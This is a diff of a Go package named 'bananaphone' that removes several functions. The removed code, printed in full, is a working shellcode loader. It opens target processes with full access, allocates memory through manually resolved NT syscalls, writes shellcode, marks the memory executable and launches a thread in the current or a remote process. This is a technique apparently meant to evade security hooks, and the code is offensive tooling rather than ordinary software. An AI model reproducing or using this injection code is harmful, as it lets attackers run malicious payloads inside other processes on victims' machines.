@@ -1,12 +1,7 @@
 package bananaphone
 
 import (
-	"fmt"
-	"syscall"
-	"time"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
 //Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
@@ -80,114 +75,5 @@ func WriteMemory(inbuf []byte, destination uintptr) {
 		writePtr := unsafe.Pointer(destination + uintptr(index))
 		v := (*byte)(writePtr)
 		*v = inbuf[index]
-	}
-}
-
-//CreateThreadDisk executes shellcode in the current thread, resolving sysid's from disk. (See CreateThread for more details)
-func CreateThreadDisk(shellcode []byte) {
-	ntalloc, _ := GetSysIDFromDisk("NtAllocateVirtualMemory")
-	ntprotect, _ := GetSysIDFromDisk("NtProtectVirtualMemory")
-	ntcreate, _ := GetSysIDFromDisk("NtCreateThreadEx")
-	CreateThread(shellcode, thisThread, ntalloc, ntprotect, ntcreate)
-}
-
-//CreateThreadMem executes shellcode in the current thread, resolving sysid's from memory. (See CreateThread for more details)
-func CreateThreadMem(shellcode []byte) {
-	ntalloc, _ := GetSysIDFromMemory("NtAllocateVirtualMemory")
-	ntprotect, _ := GetSysIDFromMemory("NtProtectVirtualMemory")
-	ntcreate, _ := GetSysIDFromMemory("NtCreateThreadEx")
-	CreateThread(shellcode, thisThread, ntalloc, ntprotect, ntcreate)
-}
-
-const (
-	//ProcessAllAccess STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xfff
-	ProcessAllAccess = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
-)
-
-//CreateRemoteThreadMemory does CreateThread with the specified shellcode and PID, reading sysid's from memory. (See CreateRemoteThread for more info).
-func CreateRemoteThreadMemory(shellcode []byte, pid uint32) {
-	h, _ := windows.OpenProcess(ProcessAllAccess, false, pid)
-	ntalloc, _ := GetSysIDFromMemory("NtAllocateVirtualMemory")
-	ntprotect, _ := GetSysIDFromMemory("NtProtectVirtualMemory")
-	ntcreate, _ := GetSysIDFromMemory("NtCreateThreadEx")
-	CreateThread(shellcode, uintptr(h), ntalloc, ntprotect, ntcreate)
-}
-
-//CreateRemoteThreadDisk does CreateThread with the specified shellcode and PID, reading sysid's from disk. (See CreateRemoteThread for more info).
-func CreateRemoteThreadDisk(shellcode []byte, pid uint32) {
-	h, _ := windows.OpenProcess(ProcessAllAccess, false, pid)
-	ntalloc, _ := GetSysIDFromDisk("NtAllocateVirtualMemory")
-	ntprotect, _ := GetSysIDFromDisk("NtProtectVirtualMemory")
-	ntcreate, _ := GetSysIDFromDisk("NtCreateThreadEx")
-	CreateThread(shellcode, uintptr(h), ntalloc, ntprotect, ntcreate)
-}
-
-/*
-CreateThread takes shellcode, and a handle, and performs NtAllocate, NtProtect, and finally an NtCreateThread. Provide Syscall ID's either dynamically (using a GetSysID function or similar), or hard-code it (but be aware that the ID changes in different versions of Windows).
-
-**Fair warning**: there is no wait in here. Threads are hard, and creating a thread in a remote process seems to create a race condition of some sort that kills a bunch of stuff. YMMV, use with caution etc.
-
-Relevant enums for each of the functions can be found below:
-	NtAllocateVirtualMemory
-		memCommit|memreserve,
-		syscall.PAGE_READWRITE,
-
-	NtProtectVirtualMemory
-		syscall.PAGE_EXECUTE_READ,
-
-	NtCreateThreadEx
-		0x1FFFFF (THREAD_ALL_ACCESS)
-*/
-func CreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
-	var baseA uintptr
-	regionsize := uintptr(len(shellcode))
-	r := NtAllocateVirtualMemoryManual(
-		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
-		handle,
-		&baseA,
-		0,
-		&regionsize,
-		uint32(memCommit|memreserve),
-		syscall.PAGE_READWRITE,
-	)
-	if r != nil {
-		fmt.Printf("1 %s\n", r)
-		return
-	}
-	//write memory
-	WriteMemory(shellcode, baseA)
-
-	var oldprotect uintptr
-	r = NtProtectVirtualMemoryManual(
-		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
-		handle,
-		&baseA,
-		&regionsize,
-		syscall.PAGE_EXECUTE_READ,
-		&oldprotect,
-	)
-	if r != nil {
-		fmt.Printf("2 %s\n", r)
-		return
-	}
-	var hhosthread uintptr
-	r = NtCreateThreadExManual(
-		NtCreateThreadExSysid, //NtCreateThreadEx
-		&hhosthread,           //hthread
-		0x1FFFFF,              //desiredaccess
-		0,                     //objattributes
-		handle,                //processhandle
-		baseA,                 //lpstartaddress
-		0,                     //lpparam
-		uintptr(0),            //createsuspended
-		0,                     //zerobits
-		0,                     //sizeofstackcommit
-		0,                     //sizeofstackreserve
-		0,                     //lpbytesbuffer
-	)
-	time.Sleep(time.Second * 2)
-	if r != nil {
-		fmt.Printf("3 %s\n", r)
-		return
 	}
 }
